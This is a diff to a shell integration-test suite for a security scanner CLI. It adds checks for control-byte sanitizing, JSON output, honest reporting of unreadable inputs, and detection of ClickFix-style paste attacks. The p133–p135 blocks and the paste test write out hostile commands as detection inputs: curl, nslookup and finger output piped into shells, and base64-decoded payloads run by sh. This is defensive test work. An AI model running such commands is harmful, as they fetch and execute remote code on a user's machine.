@@ -6539,11 +6539,527 @@ grep -q "^\.DEFAULT_GOAL := all" Makefile \
     && check "p124: Makefile pins .DEFAULT_GOAL (bare make builds)" "0" "0" \
     || check "p124: Makefile pins .DEFAULT_GOAL (bare make builds)" "0" "1"
 
+# ── p125: terminal control bytes are neutralized uniformly (CWE-150) ─────
+# HLSE prints filenames and reasons to a terminal; both can carry
+# attacker-controlled bytes (a file named "x\033[2Kfake" in a scanned tree, or
+# scanned content echoed in a finding). Raw ANSI/control sequences let an
+# attacker forge or erase an operator's output. The protect module was fixed
+# earlier; this asserts the same holds for scan, secret, and file. No byte
+# below 0x20 (except newline/tab) and no 0x7f may appear in human output.
+P125_DIR=$(mktemp -d)
+# a file whose NAME contains ESC, and whose CONTENT contains ESC + a real key
+printf 'k=AKIA2E3MWORQXYZ4567PQ\n' > "$P125_DIR/$(printf 'evil\033[31mFAKE').env"
+# LC_ALL=C so grep -P byte classes are literal; \x1b etc. must NOT appear.
+./hlse_core scan "$P125_DIR" 2>&1 \
+    | LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' \
+    && rc=1 || rc=0
+check "p125: scan output has no raw control bytes from an ANSI filename" "0" "$rc"
+
+printf 'x\033[2Ktoken=AKIA2E3MWORQXYZ4567PQ\n' | ./hlse_core secret --stdin 2>&1 \
+    | LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' \
+    && rc=1 || rc=0
+check "p125: secret finding neutralizes control bytes in echoed content" "0" "$rc"
+
+./hlse_core file "$(printf 'inv\033[31moice.pdf.exe')" 2>&1 \
+    | LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' \
+    && rc=1 || rc=0
+check "p125: file check neutralizes control bytes in a malicious name" "0" "$rc"
+
+# The finding itself must still fire — sanitizing must not suppress detection
+./hlse_core scan "$P125_DIR" >/dev/null 2>&1 && rc=0 || rc=1
+check "p125: sanitizing does not suppress the finding (still exits non-zero)" "1" "$rc"
+# url and package echo the raw target too — all subcommands must be uniform
+./hlse_core "$(printf 'https://evil\033[31m.com')" 2>&1 \
+    | LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' && rc=1 || rc=0
+check "p125: url echo neutralizes control bytes in the target" "0" "$rc"
+./hlse_core package "$(printf 'pk\033[31mg')" pip 2>&1 \
+    | LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' && rc=1 || rc=0
+check "p125: package echo neutralizes control bytes in the name" "0" "$rc"
+
+rm -rf "$P125_DIR"
+
+# ── p125: every subcommand honours --json ───────────────────────────────
+# Extracting the handlers out of main() briefly broke `--json scan`: it began
+# emitting plain text because the CLI flags were frozen into their struct after
+# the scan dispatch rather than before it. The whole suite stayed green through
+# that, because nothing asserted the flag actually reaches each handler. It
+# does now — one assertion per subcommand, checking the output parses as JSON.
+P125=$(mktemp -d)
+printf 'AWS_KEY=AKIA2E3MWORQXYZ4567PQ\n' > "$P125/a.env"
+: > "$P125/invoice.pdf.exe"
+
+p125_json() {   # name, then the argv for hlse_core
+  P125_NAME=$1; shift
+  if ./hlse_core --json "$@" 2>/dev/null | head -1 | python3 -c 'import sys,json; json.loads(sys.stdin.read())' 2>/dev/null; then
+    check "p125: --json $P125_NAME emits JSON" "0" "0"
+  else
+    check "p125: --json $P125_NAME emits JSON" "0" "1"
+  fi
+}
+p125_json url       "https://g00gle.com"
+p125_json text      text "URGENT wire gift cards"
+p125_json secret    secret "AWS_KEY=AKIA2E3MWORQXYZ4567PQ"
+p125_json file      file "invoice.pdf.exe"
+p125_json package   package reqeusts pip
+p125_json paste     paste "curl evil.sh | bash"
+p125_json clipboard clipboard "bc1qorig" "bc1qattacker"
+p125_json network   network
+p125_json audit     audit
+p125_json esp       esp "$P125"
+p125_json protect   protect "$P125" --ransomware
+
+# scan emits one object per finding plus a summary; the LAST line is the
+# summary object. This is the exact case that regressed.
+./hlse_core --json scan "$P125" 2>/dev/null | tail -1 \
+    | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); assert d["kind"]=="scan_summary", d' 2>/dev/null \
+    && check "p125: --json scan emits a JSON summary (regression guard)" "0" "0" \
+    || check "p125: --json scan emits a JSON summary (regression guard)" "0" "1"
+
+# ...and plain scan must NOT emit JSON, so the flag is doing real work
+./hlse_core scan "$P125" 2>/dev/null | tail -1 | grep -q '^{' \
+    && rc=1 || rc=0
+check "p125: plain scan emits human output, not JSON" "0" "$rc"
+
+printf 'From: CEO <b@evil.ru>\nReply-To: x@gmail.com\nSubject: urgent wire\n' \
+    | ./hlse_core --json email --stdin 2>/dev/null | head -1 \
+    | python3 -c 'import sys,json; json.loads(sys.stdin.read())' 2>/dev/null \
+    && check "p125: --json email emits JSON" "0" "0" \
+    || check "p125: --json email emits JSON" "0" "1"
+rm -rf "$P125"
+
+# ── p126: the documented library-install path actually compiles ─────────
+# `make install` puts headers under <prefix>/include/hlse/, but the README and
+# the Makefile's own "Compile against:" line pointed at <prefix>/include —
+# where nothing exists — so the documented way to use libhlse.so did not
+# compile. This installs to a temp prefix and builds a real consumer against
+# it, exactly as a user would. Skips cleanly if cc is unavailable so it can
+# never become a permanently-red check.
+if command -v cc >/dev/null 2>&1; then
+    P126=$(mktemp -d)
+    if make install PREFIX="$P126" >/dev/null 2>&1; then
+        cat > "$P126/consumer.c" <<'P126C'
+#include "hlse_core.h"
+#include <stdio.h>
+int main(void){ ScanResult r = hlse_scan("https://g00gle.com");
+                return r.score > 0 ? 0 : 1; }
+P126C
+        # the CORRECT documented path must compile, link and run
+        cc -I"$P126/include/hlse" -L"$P126/lib" -o "$P126/consumer" \
+           "$P126/consumer.c" -lhlse -lm >/dev/null 2>&1 \
+           && LD_LIBRARY_PATH="$P126/lib" "$P126/consumer" >/dev/null 2>&1 \
+           && check "p126: install + documented -I include/hlse compiles and runs" "0" "0" \
+           || check "p126: install + documented -I include/hlse compiles and runs" "0" "1"
+
+        # and the OLD path must still fail, proving the header namespacing is real
+        cc -I"$P126/include" -L"$P126/lib" -o "$P126/bad" \
+           "$P126/consumer.c" -lhlse -lm >/dev/null 2>&1 \
+           && rc=1 || rc=0
+        check "p126: bare -I include (the old wrong advice) does not resolve" "0" "$rc"
+    else
+        check "p126: install to temp prefix succeeds" "0" "1"
+    fi
+    rm -rf "$P126"
+else
+    echo "  NOTE: cc not available — p126 library-install round-trip SKIPPED."
+fi
+
+# ─── p127: a check that could not read its evidence must not claim a pass ───
+#
+# hlse_audit_sudoers() emitted AUDIT_PASS whenever its finding list was empty
+# — a condition also satisfied when /etc/sudoers (0440 root:root) was never
+# opened at all. On a host granting passwordless root, an unprivileged run
+# therefore reported "A7: No NOPASSWD entries found in sudoers" and
+# "Hardening index: 100/100 (hardened)" while root reported ALERT [40] for the
+# very same machine. These cases pin the distinction between "read it, found
+# nothing" and "could not read it".
+
+if command -v setpriv >/dev/null 2>&1 && [ "$(id -u)" = "0" ]; then
+    P127_OUT="$(setpriv --reuid=65534 --regid=65534 --clear-groups \
+                ./hlse_core audit 2>&1 || true)"
+
+    # The false PASS must be gone whenever /etc/sudoers is unreadable.
+    # Readability has to be probed AS THE UNPRIVILEGED USER: testing it from
+    # root always succeeds and would silently skip every assertion below.
+    if setpriv --reuid=65534 --regid=65534 --clear-groups \
+           test -r /etc/sudoers 2>/dev/null; then
+        echo "  NOTE: /etc/sudoers readable by nobody — p127 A7 case SKIPPED."
+    else
+        # The false PASS lived in the JSON findings array — the clean
+        # plain-text path dropped all findings, so grepping plain output for
+        # it would pass vacuously both before and after the fix.
+        P127_JSON="$(setpriv --reuid=65534 --regid=65534 --clear-groups \
+                     ./hlse_core --json audit 2>/dev/null || true)"
+
+        echo "$P127_JSON" | grep -q "A7: No NOPASSWD entries found" \
+            && rc=1 || rc=0
+        check "p127: no PASS asserted about an unreadable /etc/sudoers" "0" "$rc"
+
+        echo "$P127_JSON" | grep -q "A7: Cannot read /etc/sudoers" \
+            && rc=0 || rc=1
+        check "p127: A7 states that sudo was NOT checked (json)" "0" "$rc"
+
+        echo "$P127_OUT" | grep -q "A7: Cannot read /etc/sudoers" \
+            && rc=0 || rc=1
+        check "p127: A7 disclosure reaches plain output too" "0" "$rc"
+
+        # The reassuring band word must be withheld when coverage is partial.
+        echo "$P127_OUT" | grep -q "(hardened)" && rc=1 || rc=0
+        check "p127: band word withheld when coverage is incomplete" "0" "$rc"
+
+        echo "$P127_OUT" | grep -q "coverage incomplete" && rc=0 || rc=1
+        check "p127: clean verdict discloses incomplete coverage" "0" "$rc"
+
+        # The clean plain-text path used to drop every finding, hiding the
+        # "Cannot read" disclosures that --json showed all along.
+        echo "$P127_OUT" | grep -q "\[INFO\]" && rc=0 || rc=1
+        check "p127: clean plain output surfaces INFO findings" "0" "$rc"
+
+        echo "$P127_JSON" | grep -q '"checks_skipped":[1-9]' && rc=0 || rc=1
+        check "p127: audit JSON reports checks_skipped" "0" "$rc"
+    fi
+
+    # Root sees the real finding, and the band word is intact at full coverage.
+    ./hlse_core --json audit 2>/dev/null | grep -q '"checks_skipped":0' \
+        && rc=0 || rc=1
+    check "p127: root run reports full coverage" "0" "$rc"
+else
+    echo "  NOTE: setpriv unavailable or not root — p127 audit-coverage SKIPPED."
+fi
+
+# network degrades silently when /proc is absent; it must say so.
+if unshare -rm true >/dev/null 2>&1; then
+    P127_NET="$(unshare -rm sh -c \
+        'mount -t tmpfs none /proc 2>/dev/null; ./hlse_core network' 2>&1 || true)"
+    echo "$P127_NET" | grep -q "Not checked (unreadable)" && rc=0 || rc=1
+    check "p127: network names the sources it could not read" "0" "$rc"
+
+    echo "$P127_NET" | grep -q "/proc/net/arp" && rc=0 || rc=1
+    check "p127: network names /proc/net/arp specifically" "0" "$rc"
+
+    unshare -rm sh -c \
+        'mount -t tmpfs none /proc 2>/dev/null; ./hlse_core --json network' \
+        2>/dev/null | grep -q '"sources_unavailable"' && rc=0 || rc=1
+    check "p127: network JSON carries sources_unavailable" "0" "$rc"
+
+    # With every source readable the output must be unchanged from before.
+    ./hlse_core network 2>&1 | grep -q "Not checked" && rc=1 || rc=0
+    check "p127: no coverage warning when all sources are readable" "0" "$rc"
+
+    ./hlse_core --json network 2>/dev/null | grep -q "sources_unavailable" \
+        && rc=1 || rc=0
+    check "p127: no sources_unavailable key when coverage is complete" "0" "$rc"
+else
+    echo "  NOTE: unshare unavailable — p127 network-coverage SKIPPED."
+fi
+
+# ─── p128: `file` and `protect` must not pass off a non-inspection as OK ────
+#
+# `file` reports on a path it could not open by falling back to filename-only
+# analysis (magic-byte checks F2/F3 never run) and printed a bare "OK".
+# `protect` was worse: hlse_protect_scan() merges a module's reasons only when
+# its score is > 0, so the score-0 "Cannot open directory" diagnostic was
+# discarded before any output could show it, and a mode-000 directory scanned
+# as a clean OK.
+
+# A file that does not exist is judged on its name alone — say so.
+./hlse_core file /nonexistent-hlse-p128 2>&1 | grep -q "contents NOT inspected" \
+    && rc=0 || rc=1
+check "p128: file discloses a name-only verdict for a missing path" "0" "$rc"
+
+./hlse_core --json file /nonexistent-hlse-p128 2>/dev/null \
+    | grep -q '"content_inspected":false' && rc=0 || rc=1
+check "p128: file JSON reports content_inspected=false" "0" "$rc"
+
+# A readable file must be unaffected — no warning, and content_inspected true.
+./hlse_core file README.md 2>&1 | grep -q "contents NOT inspected" \
+    && rc=1 || rc=0
+check "p128: readable file carries no coverage warning" "0" "$rc"
+
+./hlse_core --json file README.md 2>/dev/null \
+    | grep -q '"content_inspected":true' && rc=0 || rc=1
+check "p128: file JSON reports content_inspected=true when read" "0" "$rc"
+
+if command -v setpriv >/dev/null 2>&1 && [ "$(id -u)" = "0" ]; then
+    P128="$(mktemp -d)"
+    chmod 000 "$P128"
+
+    setpriv --reuid=65534 --regid=65534 --clear-groups \
+        ./hlse_core protect "$P128" 2>&1 | grep -q "NOT scanned" && rc=0 || rc=1
+    check "p128: protect says an unopenable target was not scanned" "0" "$rc"
+
+    setpriv --reuid=65534 --regid=65534 --clear-groups \
+        ./hlse_core --json protect "$P128" 2>/dev/null \
+        | grep -q '"target_scanned":false' && rc=0 || rc=1
+    check "p128: protect JSON reports target_scanned=false" "0" "$rc"
+
+    # An existing-but-unreadable file: name-only, and it must say so.
+    setpriv --reuid=65534 --regid=65534 --clear-groups \
+        ./hlse_core file /etc/shadow 2>&1 | grep -q "contents NOT inspected" \
+        && rc=0 || rc=1
+    check "p128: file discloses an unreadable file was not inspected" "0" "$rc"
+
+    chmod 755 "$P128"; rmdir "$P128"
+else
+    echo "  NOTE: setpriv unavailable or not root — p128 denied-access SKIPPED."
+fi
+
+# A readable directory must still scan clean with no coverage warning.
+./hlse_core protect /tmp 2>&1 | grep -q "NOT scanned" && rc=1 || rc=0
+check "p128: readable protect target carries no coverage warning" "0" "$rc"
+
+./hlse_core --json protect /tmp 2>/dev/null \
+    | grep -q '"target_scanned":true' && rc=0 || rc=1
+check "p128: protect JSON reports target_scanned=true when readable" "0" "$rc"
+
+# ─── p129: `esp` called a scan of nothing "clean" ───────────────────────────
+#
+# hlse_esp_verify() handled an ABSENT ESP honestly but not an unreadable or
+# empty one: with file_count == 0 it still reported "ESP clean: scanned 0 .efi
+# binaries ... no ransom/bootkit strings" — a clean verdict on content it had
+# never read.
+
+./hlse_core esp /nonexistent-hlse-p129 2>&1 | grep -q "No EFI System Partition" \
+    && rc=0 || rc=1
+check "p129: esp still names an absent ESP plainly" "0" "$rc"
+
+./hlse_core --json esp /nonexistent-hlse-p129 2>/dev/null \
+    | grep -q '"target_scanned":false' && rc=0 || rc=1
+check "p129: esp JSON reports target_scanned=false when nothing was scanned" "0" "$rc"
+
+P129="$(mktemp -d)"
+./hlse_core esp "$P129" 2>&1 | grep -q "ESP clean" && rc=1 || rc=0
+check "p129: esp does not claim 'clean' after examining 0 binaries" "0" "$rc"
+
+./hlse_core esp "$P129" 2>&1 | grep -q "NOT scanned" && rc=0 || rc=1
+check "p129: esp says the bootloader was not scanned" "0" "$rc"
+rmdir "$P129"
+
+# ─── p130: protect's merge step dropped three modules' "could not check" ────
+#
+# hlse_protect_scan() copies a module's reasons only when its score is > 0.
+# The previous round fixed the ransomware module by carrying a flag across
+# that gate, but the gate still discarded every score-0 diagnostic from the
+# network-drive, SMB and MBR modules — so `protect <disk> --mbr` as a normal
+# user printed a bare OK after reading zero bytes of the device. Coverage
+# flags are now merged unconditionally.
+
+P130_DEV=""
+for d in /dev/vda /dev/sda /dev/nvme0n1; do [ -b "$d" ] && P130_DEV="$d" && break; done
+
+if [ -n "$P130_DEV" ]; then
+    # Decide readability INDEPENDENTLY of the tool. Branching on hlse_core's
+    # own output would make the assertion pass vacuously against a binary that
+    # never emits the message — the trap already hit twice in this suite.
+    if dd if="$P130_DEV" bs=512 count=1 of=/dev/null >/dev/null 2>&1; then
+        # Readable: nothing may be reported as unchecked.
+        ./hlse_core --json protect "$P130_DEV" --mbr 2>/dev/null \
+            | grep -q "modules_unchecked" && rc=1 || rc=0
+        check "p130: readable device reports no unchecked module" "0" "$rc"
+    else
+        # Not readable: the MBR module must say so, in both formats.
+        ./hlse_core protect "$P130_DEV" --mbr 2>&1 \
+            | grep -q "Not checked: MBR boot sector" && rc=0 || rc=1
+        check "p130: unreadable device reports the MBR module as unchecked" "0" "$rc"
+
+        ./hlse_core --json protect "$P130_DEV" --mbr 2>/dev/null \
+            | grep -q '"modules_unchecked":\["mbr"\]' && rc=0 || rc=1
+        check "p130: protect JSON lists mbr in modules_unchecked" "0" "$rc"
+    fi
+else
+    echo "  NOTE: no block device available — p130 MBR case SKIPPED."
+fi
+
+# A readable directory must report nothing as unchecked, in both formats.
+./hlse_core protect /tmp 2>&1 | grep -q "Not checked:" && rc=1 || rc=0
+check "p130: readable protect target reports no unchecked module" "0" "$rc"
+
+./hlse_core --json protect /tmp 2>/dev/null | grep -q "modules_unchecked" \
+    && rc=1 || rc=0
+check "p130: protect JSON omits modules_unchecked when all modules ran" "0" "$rc"
+
+if command -v setpriv >/dev/null 2>&1 && [ "$(id -u)" = "0" ]; then
+    P130_DIR="$(mktemp -d)"
+    chmod 000 "$P130_DIR"
+
+    P130_OUT="$(setpriv --reuid=65534 --regid=65534 --clear-groups \
+                ./hlse_core protect "$P130_DIR" 2>&1 || true)"
+
+    echo "$P130_OUT" | grep -q "Not checked: ransomware indicators" && rc=0 || rc=1
+    check "p130: locked dir reports the ransomware module as unchecked" "0" "$rc"
+
+    echo "$P130_OUT" | grep -q "Not checked: SMB canary files" && rc=0 || rc=1
+    check "p130: locked dir reports the SMB module as unchecked" "0" "$rc"
+
+    # The old redundant second sentence must be gone; the module lines say it.
+    echo "$P130_OUT" | grep -q "No file in this path was examined" && rc=1 || rc=0
+    check "p130: the duplicated target-unreadable sentence is gone" "0" "$rc"
+
+    setpriv --reuid=65534 --regid=65534 --clear-groups \
+        ./hlse_core --json protect "$P130_DIR" 2>/dev/null \
+        | grep -q '"ransomware"' && rc=0 || rc=1
+    check "p130: protect JSON names ransomware in modules_unchecked" "0" "$rc"
+
+    chmod 755 "$P130_DIR"; rmdir "$P130_DIR"
+else
+    echo "  NOTE: setpriv unavailable or not root — p130 locked-dir case SKIPPED."
+fi
+
+# ─── p131: scan skipped unreadable directories silently ─────────────────────
+#
+# The walker did `d = opendir(cur_path); if (!d) continue;`, so a tree it had
+# no permission to read produced "0 files scanned, 0 threats" and exit 0. As
+# the CI/CD entry point that means a gate over an unreadable checkout goes
+# green having inspected nothing.
+
+if command -v setpriv >/dev/null 2>&1 && [ "$(id -u)" = "0" ]; then
+    P131="$(mktemp -d)"
+    mkdir -p "$P131/locked" "$P131/open"
+    echo "nothing to see" > "$P131/open/a.txt"
+    chmod 000 "$P131/locked"
+    chmod 755 "$P131" "$P131/open"
+
+    P131_OUT="$(setpriv --reuid=65534 --regid=65534 --clear-groups \
+                ./hlse_core scan "$P131" 2>&1 || true)"
+
+    echo "$P131_OUT" | grep -q "could not be read and was skipped" && rc=0 || rc=1
+    check "p131: scan discloses a directory it could not read" "0" "$rc"
+
+    setpriv --reuid=65534 --regid=65534 --clear-groups \
+        ./hlse_core --json scan "$P131" 2>/dev/null \
+        | grep -q '"dirs_unreadable":1' && rc=0 || rc=1
+    check "p131: scan JSON reports dirs_unreadable" "0" "$rc"
+
+    chmod 755 "$P131/locked"; rm -rf "$P131"
+else
+    echo "  NOTE: setpriv unavailable or not root — p131 SKIPPED."
+fi
+
+# A fully readable tree must be unchanged: no warning, no JSON key.
+P131B="$(mktemp -d)"
+echo "plain text" > "$P131B/a.txt"
+./hlse_core scan "$P131B" 2>&1 | grep -q "could not be read" && rc=1 || rc=0
+check "p131: readable tree carries no unreadable-directory warning" "0" "$rc"
+
+./hlse_core --json scan "$P131B" 2>/dev/null | grep -q "dirs_unreadable" \
+    && rc=1 || rc=0
+check "p131: scan JSON omits dirs_unreadable when the tree is readable" "0" "$rc"
+rm -rf "$P131B"
+
+# ─── p132: the determinism invariant, proved rather than asserted ───────────
+#
+# docs/SPECIFICATION.md claimed "Same input -> same verdict. No time/random
+# dependence in scoring" unconditionally, which was false: the SMB canary
+# check scores on wall-clock recency. The invariant is now scoped to the
+# pure-analysis functions, so that half has to actually hold.
+#
+# NOTE the "|| true" on every capture: this file runs under `set -eu` and
+# hlse_core exits 1 on a threat, so an unguarded "$(...)" here silently kills
+# the whole suite from this line onward.
+
+d132() {   # $1 = label, rest = argv for hlse_core --json
+    local label="$1"; shift
+    local a b c
+    a="$(./hlse_core --json "$@" 2>/dev/null || true)"
+    b="$(LC_ALL=C TZ=UTC ./hlse_core --json "$@" 2>/dev/null || true)"
+    c="$(LC_ALL=tr_TR.UTF-8 TZ=Asia/Tokyo ./hlse_core --json "$@" 2>/dev/null || true)"
+    if [ -n "$a" ] && [ "$a" = "$b" ] && [ "$a" = "$c" ]; then rc=0; else rc=1; fi
+    check "p132: $label verdict is invariant under locale and TZ" "0" "$rc"
+}
+
+d132 "url"     "https://g00gle.com/login"
+d132 "text"    text "URGENT: your account is suspended, wire \$5000 today"
+d132 "package" package reqeusts pip
+d132 "file"    file README.md
+d132 "paste"   paste "curl http://example.invalid/i.sh | sh"
+
+# Repeated invocation must also agree with itself — P3 at the CLI level.
+a132="$(./hlse_core --json text 'URGENT: wire $5000 today' 2>/dev/null || true)"
+b132="$(./hlse_core --json text 'URGENT: wire $5000 today' 2>/dev/null || true)"
+[ -n "$a132" ] && [ "$a132" = "$b132" ] && rc=0 || rc=1
+check "p132: repeated identical input yields a byte-identical verdict" "0" "$rc"
+
+# The pure-analysis modules must contain no clock or RNG at all — the property
+# the spec now claims for them. Checked in the source: a runtime probe cannot
+# prove absence.
+if grep -qE '\b(time|rand|srand|clock|gettimeofday)[[:space:]]*\(' \
+        hlse_text.c hlse_secrets.c hlse_file.c hlse_supply.c hlse_util.c \
+        2>/dev/null; then
+    rc=1
+else
+    rc=0
+fi
+check "p132: pure-analysis modules contain no time/random calls" "0" "$rc"
+
+# ─── p133: 2026 ClickFix variants (DNS-staged, CrashFix/finger) ─────────────
+# Microsoft Threat Intelligence (Feb 2026) and follow-on write-ups describe
+# variants whose second stage arrives via nslookup output or finger.exe and is
+# piped into an interpreter -- no curl/iwr, so the download-oriented rules
+# missed them entirely.
+p133() { ./hlse_core --json paste "$1" 2>/dev/null || true; }
+p133 'nslookup -q=txt evil.example 8.8.8.8 | findstr Name | cmd' | grep -q '"score":4[0-9]\|"score":[5-9][0-9]' && rc=0 || rc=1
+check "p133: DNS-staged ClickFix (nslookup | cmd) is flagged" "0" "$rc"
+p133 'finger user@evil.example | cmd' | grep -q '"score":4[0-9]\|"score":[5-9][0-9]' && rc=0 || rc=1
+check "p133: CrashFix (finger | cmd) is flagged" "0" "$rc"
+p133 'nslookup example.com' | grep -q '"score":0' && rc=0 || rc=1
+check "p133: plain nslookup is not flagged" "0" "$rc"
+p133 'finger alice@host.example' | grep -q '"score":0' && rc=0 || rc=1
+check "p133: plain finger is not flagged" "0" "$rc"
+
+# ─── p134: remote-code-execution written without a pipe ─────────────────────
+# `curl ... | sh` scored 40 but `bash -c "$(curl ...)"`, `eval "$(curl ...)"`
+# and `zsh <(curl ...)` scored 0: the check only looked for a pipe. Same risk.
+p134() { ./hlse_core --json paste "$1" 2>/dev/null || true; }
+for cmd in 'bash -c "$(curl -fsSL http://x.io/i.sh)"' \
+           'eval "$(curl -s http://x.io/i.sh)"' \
+           'zsh <(curl -s http://x.io/i.sh)' \
+           'sh -c "$(wget -qO- http://x.io/i.sh)"' \
+           'curl -s http://x.io/i.sh | zsh'; do
+    p134 "$cmd" | grep -q '"score":[4-9][0-9]' && rc=0 || rc=1
+    check "p134: flagged: $cmd" "0" "$rc"
+done
+for cmd in 'curl -O http://x.io/file.tar.gz' \
+           'VER=$(curl -s http://x.io/version); echo $VER'; do
+    p134 "$cmd" | grep -q '"score":0' && rc=0 || rc=1
+    check "p134: benign not flagged: $cmd" "0" "$rc"
+done
+
+# ─── p135: decoding is not the same as executing what was decoded ───────────
+# P5 scored every decoder at 30, so `base64 -d` alone and `base64 -d | zsh`
+# were indistinguishable even though only one runs the decoded bytes.
+p135() { ./hlse_core --json paste "$1" 2>/dev/null || true; }
+p135 'echo Y3VybCB4LmlvL2E= | base64 -d | zsh' | grep -q '"score":[5-9][0-9]' && rc=0 || rc=1
+check "p135: base64 -d | zsh is raised above the bare-decoder score" "0" "$rc"
+p135 'echo Y3VybCB4LmlvL2E= | base64 --decode | sh' | grep -q '"score":[5-9][0-9]' && rc=0 || rc=1
+check "p135: base64 --decode | sh is raised above the bare-decoder score" "0" "$rc"
+p135 'echo aGVsbG8= | base64 -d' | grep -q '"score":30' && rc=0 || rc=1
+check "p135: a bare decode stays at the decoder score" "0" "$rc"
+p135 'base64 -d < payload.b64 > out.bin' | grep -q '"score":30' && rc=0 || rc=1
+check "p135: decode to a file stays at the decoder score" "0" "$rc"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
 echo "═════════════════════════════════"
 echo "  CLI Integration: $PASS passed, $FAIL failed"
 echo "═════════════════════════════════"
+
+# A floor on the number of checks that actually ran.
+#
+# Zero failures is not the same as "the suite ran". This file uses `set -eu`,
+# so one unguarded "$(./hlse_core ...)" on an input that scores a threat exits
+# 1 and terminates everything after it — which happened while p132 was being
+# written, silently dropping the tail of the suite. Several blocks also skip
+# themselves when setpriv/unshare/strace/cc are missing, so quiet shrinkage is
+# a realistic way to lose coverage without anyone noticing.
+#
+# Keep this a little below the current count so that legitimately skipped
+# environment-dependent blocks do not turn it red; raise it when the suite
+# grows substantially.
+MIN_CHECKS=800
+if [ "$PASS" -lt "$MIN_CHECKS" ]; then
+    echo "FAIL: only $PASS checks ran (expected at least $MIN_CHECKS)."
+    echo "      The suite was truncated or too many blocks skipped."
+    exit 1
+fi
 
 [ "$FAIL" -eq 0 ]
